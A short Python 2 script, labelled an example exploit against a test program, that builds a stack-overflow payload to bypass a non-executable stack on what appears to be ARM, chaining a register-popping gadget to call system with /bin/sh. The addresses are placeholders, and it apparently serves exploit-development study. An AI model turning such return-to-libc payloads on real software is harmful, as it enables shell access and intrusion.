#!/usr/bin/python
#
# Exploit title: test.c example exploit to bypass non-executable stack
#
# Exploit author: oneforty4
#

import struct

bufsize = 260		# number of junk bytes to fill the buffer with

exploit =  'A' * bufsize			# fill string with junk
exploit += struct.pack("<I", 0xAABBCCDD)	# $pc -> pop { r0, r4, pc } <memmove+ >
exploit += struct.pack("<I", 0xAABBCCDD)	# $r0 -> /bin/sh
exploit += 'B' * 4				# $r4 -> padding
exploit += struct.pack("<I", 0xAABBCCDD)	# $pc -> system

print exploit
